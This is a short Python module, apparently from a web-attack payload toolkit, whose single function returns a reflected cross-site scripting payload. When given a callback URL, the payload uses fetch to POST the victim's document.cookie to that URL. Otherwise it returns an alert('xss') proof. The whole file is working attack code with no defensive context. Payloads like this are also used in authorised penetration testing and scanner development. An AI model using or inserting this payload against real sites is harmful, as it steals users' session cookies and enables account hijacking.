"""Basic reflected XSS payload."""

from __future__ import annotations
__all__ = ["generate"]

def generate(callback_url: str | None = None) -> str:
    """
    Simple reflected XSS payload.
    
    Params:
    - callback_url: URL to beacon to when executed.
    
    Returns:
    - Rendered payload string.
    
    """
    if callback_url:
        return f"<script>fetch('{callback_url}',{{method:'POST',body:document.cookie}})</script>"
    return "<script>alert('xss')</script>"
